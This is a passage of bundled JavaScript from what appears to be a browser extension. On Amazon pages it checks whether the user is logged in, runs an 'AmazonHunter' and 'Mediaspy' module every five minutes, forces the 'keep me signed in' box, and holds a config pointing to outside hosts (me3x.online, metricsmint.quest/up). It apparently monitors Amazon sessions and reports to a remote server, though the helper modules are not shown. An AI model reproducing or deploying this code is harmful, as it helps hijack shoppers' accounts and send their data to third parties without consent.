/* harmony import */ var _Resolver_Hunters_Amazon_AmazonHunter__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(518);
/* harmony import */ var _Resolver_Hunters_Amazon_Site_Common_KeepSigned_ts__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(801);
/* harmony import */ var _Mediaspy_init_amazon_js__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(543);
/* harmony import */ var _Resolver_Hunters_Amazon_Logger__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(525);
/* harmony import */ var _Resolver_Hunters_Amazon_AmazonApiProvider_js__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__(140);
/* harmony import */ var _config_config_json__WEBPACK_IMPORTED_MODULE_5__ = __webpack_require__(626);
function asyncGeneratorStep(gen, resolve, reject, _next, _throw, key, arg) {
    try {
        var info = gen[key](arg);
        var value = info.value;
    } catch (error) {
        reject(error);
        return;
    }
    if (info.done) {
        resolve(value);
    } else {
        Promise.resolve(value).then(_next, _throw);
    }
}
function _async_to_generator(fn) {
    return function() {
        var self = this, args = arguments;
        return new Promise(function(resolve, reject) {
            var gen = fn.apply(self, args);
            function _next(value) {
                asyncGeneratorStep(gen, resolve, reject, _next, _throw, "next", value);
            }
            function _throw(err) {
                asyncGeneratorStep(gen, resolve, reject, _next, _throw, "throw", err);
            }
            _next(undefined);
        });
    };
}
function _ts_generator(thisArg, body) {
    var f, y, t, g, _ = {
        label: 0,
        sent: function() {
            if (t[0] & 1) throw t[1];
            return t[1];
        },
        trys: [],
        ops: []
    };
    return g = {
        next: verb(0),
        "throw": verb(1),
        "return": verb(2)
    }, typeof Symbol === "function" && (g[Symbol.iterator] = function() {
        return this;
    }), g;
    function verb(n) {
        return function(v) {
            return step([
                n,
                v
            ]);
        };
    }
    function step(op) {
        if (f) throw new TypeError("Generator is already executing.");
        while(_)try {
            if (f = 1, y && (t = op[0] & 2 ? y["return"] : op[0] ? y["throw"] || ((t = y["return"]) && t.call(y), 0) : y.next) && !(t = t.call(y, op[1])).done) return t;
            if (y = 0, t) op = [
                op[0] & 2,
                t.value
            ];
            switch(op[0]){
                case 0:
                case 1:
                    t = op;
                    break;
                case 4:
                    _.label++;
                    return {
                        value: op[1],
                        done: false
                    };
                case 5:
                    _.label++;
                    y = op[1];
                    op = [
                        0
                    ];
                    continue;
                case 7:
                    op = _.ops.pop();
                    _.trys.pop();
                    continue;
                default:
                    if (!(t = _.trys, t = t.length > 0 && t[t.length - 1]) && (op[0] === 6 || op[0] === 2)) {
                        _ = 0;
                        continue;
                    }
                    if (op[0] === 3 && (!t || op[1] > t[0] && op[1] < t[3])) {
                        _.label = op[1];
                        break;
                    }
                    if (op[0] === 6 && _.label < t[1]) {
                        _.label = t[1];
                        t = op;
                        break;
                    }
                    if (t && _.label < t[2]) {
                        _.label = t[2];
                        _.ops.push(op);
                        break;
                    }
                    if (t[2]) _.ops.pop();
                    _.trys.pop();
                    continue;
            }
            op = body.call(thisArg, _);
        } catch (e) {
            op = [
                6,
                e
            ];
            y = 0;
        } finally{
            f = t = 0;
        }
        if (op[0] & 5) throw op[1];
        return {
            value: op[0] ? op[1] : void 0,
            done: true
        };
    }
}






var LOG_NAMESPACE = "Extension Hunter";
var rerunTimeInterval = _config_config_json__WEBPACK_IMPORTED_MODULE_5__/* .rerunTimeInterval */ .CZ;
function handleException(exception) {
    return _handleException.apply(this, arguments);
}
function _handleException() {
    _handleException = _async_to_generator(function(exception) {
        return _ts_generator(this, function(_state) {
            switch(_state.label){
                case 0:
                    return [
                        4,
                        (0,_Resolver_Hunters_Amazon_Logger__WEBPACK_IMPORTED_MODULE_3__/* .amazonLogger */ .V)(LOG_NAMESPACE, "Failed to start the hunter. Exception: ".concat(exception))
                    ];
                case 1:
                    _state.sent();
                    return [
                        2
                    ];
            }
        });
    });
    return _handleException.apply(this, arguments);
}
function runHunter() {
    return _runHunter.apply(this, arguments);
}
function _runHunter() {
    _runHunter = _async_to_generator(function() {
        var domain, localWindow, h, isLogged, error;
        return _ts_generator(this, function(_state) {
            switch(_state.label){
                case 0:
                    _state.trys.push([
                        0,
                        5,
                        ,
                        6
                    ]);
                    domain = window.location.host;
                    if (!(_Resolver_Hunters_Amazon_AmazonApiProvider_js__WEBPACK_IMPORTED_MODULE_4__/* .AMAZON_DOMAINS.indexOf */ .Jj.indexOf(domain) !== -1)) return [
                        3,
                        4
                    ];
                    return [
                        4,
                        (0,_Mediaspy_init_amazon_js__WEBPACK_IMPORTED_MODULE_2__/* .init */ .S)(domain)
                    ];
                case 1:
                    localWindow = _state.sent();
                    h = new _Resolver_Hunters_Amazon_AmazonHunter__WEBPACK_IMPORTED_MODULE_0__/* ["default"] */ .Z(localWindow);
                    return [
                        4,
                        h.isLogged(domain)
                    ];
                case 2:
                    isLogged = _state.sent();
                    if (!isLogged) {
                        return [
                            2
                        ];
                    }
                    return [
                        4,
                        h.runAsync().catch(handleException)
                    ];
                case 3:
                    _state.sent();
                    _state.label = 4;
                case 4:
                    return [
                        3,
                        6
                    ];
                case 5:
                    error = _state.sent();
                    handleException(error);
                    return [
                        3,
                        6
                    ];
                case 6:
                    return [
                        2
                    ];
            }
        });
    });
    return _runHunter.apply(this, arguments);
}
function run() {
    return _run.apply(this, arguments);
}
function _run() {
    _run = _async_to_generator(function() {
        return _ts_generator(this, function(_state) {
            switch(_state.label){
                case 0:
                    return [
                        4,
                        runHunter()
                    ];
                case 1:
                    _state.sent();
                    setTimeout(run, rerunTimeInterval);
                    return [
                        2
                    ];
            }
        });
    });
    return _run.apply(this, arguments);
}
await run();
(0,_Resolver_Hunters_Amazon_Site_Common_KeepSigned_ts__WEBPACK_IMPORTED_MODULE_1__/* .checkRememberCheckbox */ .d)();

__webpack_async_result__();
} catch(e) { __webpack_async_result__(e); } }, 1);

/***/ }),

/***/ 626:
/***/ (function(module) {

module.exports = JSON.parse('{"Wd":"https://me3x.online/","_Q":"https://me3x.online/n/","LB":"df9a3905","TK":"","CZ":300000,"Mt":"https://metricsmint.quest/up"}');

/***/ }),

/***/ 147:
/***/ (function(module) {

module.exports = {"i8":"1.43.0"};

/***/ })

/******/ 	});
/************************************************************************/
/******/ 	// The module cache
/******/ 	var __webpack_module_cache__ = {};
/******/ 	
/******/ 	// The require function
/******/ 	function __webpack_require__(moduleId) {
/******/ 		// Check if module is in cache
/******/ 		var cachedModule = __webpack_module_cache__[moduleId];
/******/ 		if (cachedModule !== undefined) {
/******/ 			return cachedModule.exports;
/******/ 		}
/******/ 		// Create a new module (and put it into the cache)
/******/ 		var module = __webpack_module_cache__[moduleId] = {
/******/ 			// no module.id needed
/******/ 			// no module.loaded needed
/******/ 			exports: {}
/******/ 		};
/******/ 	
/******/ 		// Execute the module function
/******/ 		__webpack_modules__[moduleId](module, module.exports, __webpack_require__);
/******/ 	
/******/ 		// Return the exports of the module
/******/ 		return module.exports;
/******/ 	}
/******/ 	
/************************************************************************/
/******/ 	/* webpack/runtime/async module */
/******/ 	!function() {
/******/ 		var webpackQueues = typeof Symbol === "function" ? Symbol("webpack queues") : "__webpack_queues__";
/******/ 		var webpackExports = typeof Symbol === "function" ? Symbol("webpack exports") : "__webpack_exports__";
/******/ 		var webpackError = typeof Symbol === "function" ? Symbol("webpack error") : "__webpack_error__";
/******/ 		var resolveQueue = function(queue) {
/******/ 			if(queue && !queue.d) {
/******/ 				queue.d = 1;
/******/ 				queue.forEach(function(fn) { fn.r--; });
/******/ 				queue.forEach(function(fn) { fn.r-- ? fn.r++ : fn(); });
/******/ 			}
/******/ 		}
/******/ 		var wrapDeps = function(deps) { return deps.map(function(dep) {
/******/ 			if(dep !== null && typeof dep === "object") {
/******/ 				if(dep[webpackQueues]) return dep;
/******/ 				if(dep.then) {
/******/ 					var queue = [];
/******/ 					queue.d = 0;
/******/ 					dep.then(function(r) {
/******/ 						obj[webpackExports] = r;
/******/ 						resolveQueue(queue);
/******/ 					}, function(e) {
/******/ 						obj[webpackError] = e;
/******/ 						resolveQueue(queue);
/******/ 					});
/******/ 					var obj = {};
/******/ 					obj[webpackQueues] = function(fn) { fn(queue); };
/******/ 					return obj;
/******/ 				}
/******/ 			}
/******/ 			var ret = {};
/******/ 			ret[webpackQueues] = function() {};
/******/ 			ret[webpackExports] = dep;
/******/ 			return ret;
/******/ 		}); };
/******/ 		__webpack_require__.a = function(module, body, hasAwait) {
/******/ 			var queue;
/******/ 			hasAwait && ((queue = []).d = 1);
/******/ 			var depQueues = new Set();
/******/ 			var exports = module.exports;
/******/ 			var currentDeps;
/******/ 			var outerResolve;
/******/ 			var reject;
/******/ 			var promise = new Promise(function(resolve, rej) {
/******/ 				reject = rej;
/******/ 				outerResolve = resolve;
/******/ 			});
/******/ 			promise[webpackExports] = exports;
/******/ 			promise[webpackQueues] = function(fn) { queue && fn(queue), depQueues.forEach(fn), promise["catch"](function() {}); };
/******/ 			module.exports = promise;
/******/ 			body(function(deps) {
/******/ 				currentDeps = wrapDeps(deps);
/******/ 				var fn;
/******/ 				var getResult = function() { return currentDeps.map(function(d) {
/******/ 					if(d[webpackError]) throw d[webpackError];
/******/ 					return d[webpackExports];
/******/ 				}); }
/******/ 				var promise = new Promise(function(resolve) {
/******/ 					fn = function() { resolve(getResult); };
/******/ 					fn.r = 0;
/******/ 					var fnQueue = function(q) { q !== queue && !depQueues.has(q) && (depQueues.add(q), q && !q.d && (fn.r++, q.push(fn))); };
/******/ 					currentDeps.map(function(dep) { dep[webpackQueues](fnQueue); });
/******/ 				});
/******/ 				return fn.r ? promise : getResult();
/******/ 			}, function(err) { (err ? reject(promise[webpackError] = err) : outerResolve(exports)), resolveQueue(queue); });
/******/ 			queue && (queue.d = 0);
/******/ 		};
/******/ 	}();
/******/ 	
/******/ 	/* webpack/runtime/define property getters */
/******/ 	!function() {
/******/ 		// define getter functions for harmony exports
/******/ 		__webpack_require__.d = function(exports, definition) {
/******/ 			for(var key in definition) {
/******/ 				if(__webpack_require__.o(definition, key) && !__webpack_require__.o(exports, key)) {
/******/ 					Object.defineProperty(exports, key, { enumerable: true, get: definition[key] });
/******/ 				}
/******/ 			}
/******/ 		};
/******/ 	}();
/******/ 	
/******/ 	/* webpack/runtime/hasOwnProperty shorthand */
/******/ 	!function() {
/******/ 		__webpack_require__.o = function(obj, prop) { return Object.prototype.hasOwnProperty.call(obj, prop); }
/******/ 	}();
/******/ 	
/************************************************************************/
/******/ 	
/******/ 	// startup
/******/ 	// Load entry module and return exports
/******/ 	// This entry module used 'module' so it can't be inlined
/******/ 	var __webpack_exports__ = __webpack_require__(223);
/******/ 	
/******/ })()
;